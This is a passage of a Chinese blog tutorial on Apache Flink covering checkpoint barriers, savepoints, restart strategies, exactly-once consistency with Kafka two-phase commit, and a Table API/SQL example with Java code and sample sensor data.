src="https://img-blog.csdnimg.cn/20200529225235834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ZmcOH&originHeight=319&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>分界线对齐：barrier向下游传递，sum任务会等待所有输入分区的barrier到达</strong></li><li><strong>对于barrier已经达到的分区，继续到达的数据会被缓存</strong></li><li><strong>而barrier尚未到达的分区，数据会被正常处理</strong></li></ul><pre><code>_此时蓝色流的barrier先一步抵达了偶数流，黄色的barrier还未到，但是因为数据的不中断一直处理，此时的先到的蓝色的barrier会将此时的偶数流的数据4进行缓存处理，流接着处理接下来的数据等待着黄色的barrier的到来，而黄色barrier之前的数据将会对缓存的数据相加__这次处理的总结：**分界线对齐**：**barrier 向下游传递，sum 任务会等待所有输入分区的 barrier 到达，对于barrier已经到达的分区，继续到达的数据会被缓存。而barrier尚未到达的分区，数据会被正常处理**_</code></pre><p><img src="https://img-blog.csdnimg.cn/20200529225656902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=a9enr&originHeight=290&originWidth=633&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>当收到所有输入分区的 barrier 时，任务就将其状态保存到状态后端的检查点中，然后将 barrier 继续向下游转发</strong></li></ul><pre><code>_当蓝色的barrier和黄色的barrier(所有分区的)都到达后，进行状态保存到远程仓库，**然后对JobManager发送消息，说自己的检查点保存完毕了**__此时的偶数流和奇数流都为8_</code></pre><p><img src="https://img-blog.csdnimg.cn/20200529230413317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=TKI2Z&originHeight=262&originWidth=643&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>向下游转发检查点 barrier 后，任务继续正常的数据处理</li></ul><p><img src="https://img-blog.csdnimg.cn/2020052923042436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=A42fh&originHeight=297&originWidth=609&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>Sink 任务向 JobManager 确认状态保存到 checkpoint 完毕</strong></li><li><strong>当所有任务都确认已成功将状态保存到检查点时，检查点就真正完成了</strong></li></ul><h4 id="保存点-Savepoints"><a href="#保存点-Savepoints" class="headerlink" title="保存点(Savepoints)"></a>保存点(Savepoints)</h4><p><strong>CheckPoint为自动保存，SavePoint为手动保存</strong></p><ul><li>Flink还提供了可以自定义的镜像保存功能，就是保存点（save points）</li><li>原则上，创建保存点使用的算法与检查点完全相同，因此保存点可以认为就是具有一些额外元数据的检查点</li><li>Flink不会自动创建保存点，因此用户（或者外部调度程序）必须明确地触发创建操作</li><li>保存点是一个强大的功能。除了故障恢复外，保存点可以用于：有计划的手动备份、更新应用程序、版本迁移、暂停和重启程序，等等</li></ul><h4 id="检查点和重启策略配置"><a href="#检查点和重启策略配置" class="headerlink" title="检查点和重启策略配置"></a>检查点和重启策略配置</h4><ul><li> java样例代码  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.restartstrategy.RestartStrategies;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.contrib.streaming.state.RocksDBStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.filesystem.FsStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.memory.MemoryStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.CheckpointingMode;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 11:35 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest4_FaultTolerance</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 状态后端配置</span></span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> MemoryStateBackend());</span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> FsStateBackend(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="comment">// 这个需要另外导入依赖</span></span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> RocksDBStateBackend(<span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 检查点配置 (每300ms让jobManager进行一次checkpoint检查)</span></span><br><span class="line">    env.enableCheckpointing(<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 高级选项</span></span><br><span class="line">    env.getCheckpointConfig().setCheckpointingMode(CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">    <span class="comment">//Checkpoint的处理超时时间</span></span><br><span class="line">    env.getCheckpointConfig().setCheckpointTimeout(<span class="number">60000L</span>);</span><br><span class="line">    <span class="comment">// 最大允许同时处理几个Checkpoint(比如上一个处理到一半，这里又收到一个待处理的Checkpoint事件)</span></span><br><span class="line">    env.getCheckpointConfig().setMaxConcurrentCheckpoints(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 与上面setMaxConcurrentCheckpoints(2) 冲突，这个时间间隔是 当前checkpoint的处理完成时间与接收最新一个checkpoint之间的时间间隔</span></span><br><span class="line">    env.getCheckpointConfig().setMinPauseBetweenCheckpoints(<span class="number">100L</span>);</span><br><span class="line">    <span class="comment">// 如果同时开启了savepoint且有更新的备份，是否倾向于使用更老的自动备份checkpoint来恢复，默认false</span></span><br><span class="line">    env.getCheckpointConfig().setPreferCheckpointForRecovery(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 最多能容忍几次checkpoint处理失败（默认0，即checkpoint处理失败，就当作程序执行异常）</span></span><br><span class="line">    env.getCheckpointConfig().setTolerableCheckpointFailureNumber(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 重启策略配置</span></span><br><span class="line">    <span class="comment">// 固定延迟重启(最多尝试3次，每次间隔10s)</span></span><br><span class="line">    env.setRestartStrategy(RestartStrategies.fixedDelayRestart(<span class="number">3</span>, <span class="number">10000L</span>));</span><br><span class="line">    <span class="comment">// 失败率重启(在10分钟内最多尝试3次，每次至少间隔1分钟)</span></span><br><span class="line">    env.setRestartStrategy(RestartStrategies.failureRateRestart(<span class="number">3</span>, Time.minutes(<span class="number">10</span>), Time.minutes(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket文本流</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    dataStream.print();</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="状态一致性"><a href="#状态一致性" class="headerlink" title="状态一致性"></a>状态一致性</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106445029">Flink-状态一致性 | 状态一致性分类 | 端到端状态一致性 | 幂等写入 | 事务写入 | WAL | 2PC</a></p></blockquote><h5 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h5><p><img src="https://img-blog.csdnimg.cn/20200530181851687.png###id=mLBqB&originHeight=158&originWidth=688&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 有状态的流处理，内部每个算子任务都可以有自己的状态 </li><li> 对于流处理器内部来说，所谓的状态一致性，其实就是我们所说的计算结果要保证准确。 </li><li> 一条数据不应该丢失，也不应该重复计算 </li><li> 在遇到故障时可以恢复状态，恢复以后的重新计算，结果应该也是完全正确的。 </li></ul><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><pre><code>**Flink的一个重大价值在于，它既保证了exactly-once，也具有低延迟和高吞吐的处理能力。**</code></pre><ol><li> AT-MOST-ONCE（最多一次）<br>当任务故障时，最简单的做法是什么都不干，既不恢复丢失的状态，也不重播丢失的数据。At-most-once 语义的含义是最多处理一次事件。<br><em>这其实是没有正确性保障的委婉说法——故障发生之后，计算结果可能丢失。类似的比如网络协议的udp。</em> </li><li> AT-LEAST-ONCE（至少一次）<br>在大多数的真实应用场景，我们希望不丢失事件。这种类型的保障称为 at-least-once，意思是所有的事件都得到了处理，而一些事件还可能被处理多次。<br><em>这表示计数结果可能大于正确值，但绝不会小于正确值。也就是说，计数程序在发生故障后可能多算，但是绝不会少算。</em> </li><li> EXACTLY-ONCE（精确一次）</li></ol><p><strong>恰好处理一次是最严格的保证，也是最难实现的。恰好处理一次语义不仅仅意味着没有事件丢失，还意味着针对每一个数据，内部状态仅仅更新一次。</strong><br><em>这指的是系统保证在发生故障后得到的计数结果与正确值一致。</em> </p><h5 id="一致性检查点-Checkpoints"><a href="#一致性检查点-Checkpoints" class="headerlink" title="一致性检查点(Checkpoints)"></a>一致性检查点(Checkpoints)</h5><ul><li>Flink使用了一种轻量级快照机制——检查点（checkpoint）来保证exactly-once语义</li><li>有状态流应用的一致检查点，其实就是：所有任务的状态，在某个时间点的一份备份（一份快照）。而这个时间点，应该是所有任务都恰好处理完一个相同的输入数据的时间。</li><li>应用状态的一致检查点，是Flink故障恢复机制的核心</li></ul><h6 id="端到端-end-to-end-状态一致性"><a href="#端到端-end-to-end-状态一致性" class="headerlink" title="端到端(end-to-end)状态一致性"></a>端到端(end-to-end)状态一致性</h6><ul><li> 目前我们看到的一致性保证都是由流处理器实现的，也就是说都是在Flink流处理器内部保证的；而在真实应用中，流处理应用除了流处理器以外还包含了数据源（例如Kafka）和输出到持久化系统 </li><li> 端到端的一致性保证，意味着结果的正确性贯穿了整个流处理应用的始终；每一个组件都保证了它自己的一致性 </li><li> <strong>整个端到端的一致性级别取决于所有组件中一致性最弱的组件</strong> </li></ul><h6 id="端到端-exactly-once"><a href="#端到端-exactly-once" class="headerlink" title="端到端 exactly-once"></a>端到端 exactly-once</h6><ul><li>内部保证——checkpoint</li><li>source端——可重设数据的读取位置</li><li>sink端——从故障恢复时，数据不会重复写入外部系统 <ul><li>幂等写入</li><li>事务写入</li></ul></li></ul><p>####### 幂等写入</p><ul><li> 所谓幂等操作，是说一个操作，可以重复执行很多次，但只导致一次结果更改，也就是说，后面再重复执行就不起作用了。<br><em>（中间可能会存在不正确的情况，只能保证最后结果正确。比如5=&gt;10=&gt;15=&gt;5=&gt;10=&gt;15，虽然最后是恢复到了15，但是中间有个恢复的过程，如果这个过程能够被读取，就会出问题。）</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/2020053019091138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=lRCMu&originHeight=228&originWidth=606&originalType=binary&ratio=1&status=done&style=none"></p><p>####### 事务写入</p><ul><li>事务（Transaction） <ul><li>应用程序中一系列严密的操作，所有操作必须成功完成，否则在每个操作中所作的所有更改都会被撤销</li><li>具有原子性：一个事务中的一系列的操作要么全部成功，要么一个都不做</li></ul></li><li> 实现思想</li></ul><p><strong>构建的事务对应着checkpoint，等到checkpoint真正完成的时候，才把所有对应的结果写入sink系统中</strong>。 </p><ul><li>实现方式 <ul><li>预习日志</li><li>两阶段提交</li></ul></li></ul><p>######## 预写日志(Write-Ahead-Log，WAL)</p><ul><li>把结果数据先当成状态保存，然后在收到checkpoint完成的通知时，一次性写入sink系统</li><li>简单易于实现，由于数据提前在状态后端中做了缓存，所以无论什么sink系统，都能用这种方式一批搞定</li><li>DataStream API提供了一个模版类：GenericWriteAheadSink，来实现这种事务性sink</li></ul><p>######## 两阶段提交(Two-Phase-Commit，2PC)</p><ul><li>对于每个checkpoint，sink任务会启动一个事务，并将接下来所有接收到的数据添加到事务里</li><li>然后将这些数据写入外部sink系统，但不提交它们——这时只是”预提交”</li><li><strong>这种方式真正实现了exactly-once，它需要一个提供事务支持的外部sink系统</strong>。Flink提供了TwoPhaseCommitSinkFunction接口</li></ul><h6 id="不同Source和Sink的一致性保证"><a href="#不同Source和Sink的一致性保证" class="headerlink" title="不同Source和Sink的一致性保证"></a>不同Source和Sink的一致性保证</h6><p><img src="https://img-blog.csdnimg.cn/20200530194322578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=aG7fq&originHeight=371&originWidth=650&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="Flink-Kafka-端到端状态一致性的保证"><a href="#Flink-Kafka-端到端状态一致性的保证" class="headerlink" title="Flink+Kafka 端到端状态一致性的保证"></a>Flink+Kafka 端到端状态一致性的保证</h4><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106445029">Flink-状态一致性 | 状态一致性分类 | 端到端状态一致性 | 幂等写入 | 事务写入 | WAL | 2PC</a></p></blockquote><ul><li>内部——利用checkpoint机制，把状态存盘，发生故障的时候可以恢复，保证内部的状态一致性</li><li>source——kafka consumer作为source，可以将偏移量保存下来，如果后续任务出现了故障，恢复的时候可以由连接器重制偏移量，重新消费数据，保证一致性</li><li>sink——kafka producer作为sink，采用两阶段提交sink，需要实现一个TwoPhaseCommitSinkFunction</li></ul><h5 id="Exactly-once-两阶段提交"><a href="#Exactly-once-两阶段提交" class="headerlink" title="Exactly-once 两阶段提交"></a>Exactly-once 两阶段提交</h5><p><img src="https://img-blog.csdnimg.cn/20200530194434435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=P4LSp&originHeight=280&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>JobManager 协调各个 TaskManager 进行 checkpoint 存储</li><li>checkpoint保存在 StateBackend中，默认StateBackend是内存级的，也可以改为文件级的进行持久化保存</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194627287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=qPTZZ&originHeight=280&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>当 checkpoint 启动时，JobManager 会将检查点分界线（barrier）注入数据流</li><li>barrier会在算子间传递下去</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194657186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=kcWtB&originHeight=310&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>每个算子会对当前的状态做个快照，保存到状态后端</li><li>checkpoint 机制可以保证内部的状态一致性</li></ul><p><img src="https://img-blog.csdnimg.cn/20200530194835593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=rfSyY&originHeight=310&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 每个内部的 transform 任务遇到 barrier 时，都会把状态存到 checkpoint 里 </li><li> sink 任务首先把数据写入外部 kafka，<strong>这些数据都属于预提交的事务</strong>；<strong>遇到 barrier 时，把状态保存到状态后端，并开启新的预提交事务</strong><br><em>(barrier之前的数据还是在之前的事务中没关闭事务，遇到barrier后的数据另外新开启一个事务)</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/2020053019485194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=czcKT&originHeight=275&originWidth=655&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>当所有算子任务的快照完成，也就是这次的 checkpoint 完成时，JobManager 会向所有任务发通知，确认这次 checkpoint 完成</li><li>sink 任务收到确认通知，正式提交之前的事务，kafka 中未确认数据改为“已确认”</li></ul><h5 id="Exactly-once-两阶段提交步骤总结"><a href="#Exactly-once-两阶段提交步骤总结" class="headerlink" title="Exactly-once 两阶段提交步骤总结"></a>Exactly-once 两阶段提交步骤总结</h5><ol><li>第一条数据来了之后，开启一个 kafka 的事务（transaction），正常写入 kafka 分区日志但标记为未提交，这就是“预提交”</li><li>jobmanager 触发 checkpoint 操作，barrier 从 source 开始向下传递，遇到 barrier 的算子将状态存入状态后端，并通知 jobmanager</li><li>sink 连接器收到 barrier，保存当前状态，存入 checkpoint，通知 jobmanager，并开启下一阶段的事务，用于提交下个检查点的数据</li><li>jobmanager 收到所有任务的通知，发出确认信息，表示 checkpoint 完成</li><li>sink 任务收到 jobmanager 的确认信息，正式提交这段时间的数据</li><li>外部kafka关闭事务，提交的数据可以正常消费了。</li></ol><h3 id="Table-API和Flink-SQL"><a href="#Table-API和Flink-SQL" class="headerlink" title="Table API和Flink SQL"></a>Table API和Flink SQL</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106457648">Flink-Table API 和 Flink SQL简介 | 新老版本Flink批流处理对比 | 读取文件和Kafka消费数据 | API 和 SQL查询表</a></p><p><a href="https://blog.csdn.net/weixin_41956627/article/details/110050094">flink-Table&amp;sql-碰到的几个问题记录</a></p></blockquote><h4 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h4><ul><li>Flink 对批处理和流处理，提供了统一的上层 API</li><li>Table API 是一套内嵌在 Java 和 Scala 语言中的查询API，它允许以非常直观的方式组合来自一些关系运算符的查询</li><li>Flink 的 SQL 支持基于实现了 SQL 标准的 Apache Calcite</li></ul><p><img src="https://img-blog.csdnimg.cn/20200531165328668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=yGApT&originHeight=217&originWidth=651&originalType=binary&ratio=1&status=done&style=none"></p><h5 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h5><ul><li><p> 导入pom依赖，1.11.X之后，推荐使用blink版本  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Table API 和 Flink SQL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-table-planner-blink_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java样例代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 5:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest1_Example</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 创建表环境</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 基于流创建一张表</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 调用table API进行转换操作</span></span><br><span class="line">    Table resultTable = dataTable.select(<span class="string">&quot;id, temperature&quot;</span>)</span><br><span class="line">      .where(<span class="string">&quot;id = &#x27;sensor_1&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line">    String sql = <span class="string">&quot;select id, temperature from sensor where id = &#x27;sensor_1&#x27;&quot;</span>;</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(sql);</span><br><span class="line"></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> Txt文件  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_6,1547718201,15.4</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_10,1547718205,38.1</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_1,1547718209,32.8</span><br><span class="line">sensor_1,1547718212,37.1</span><br></pre></td></tr></table></figure></li><li><p> 输出结果  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,35.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,35.8</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,36.3</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,36.3</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,32.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,32.8</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,37.1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,37.1</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="基本程序结构"><a href="#基本程序结构" class="headerlink" title="基本程序结构"></a>基本程序结构</h4><ul><li> Table API和SQL的程序结构，与流式处理的程序结构十分类似  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StreamTableEnvironment tableEnv = ... <span class="comment">// 创建表的执行环境</span></span><br><span class="line"></span><br><span 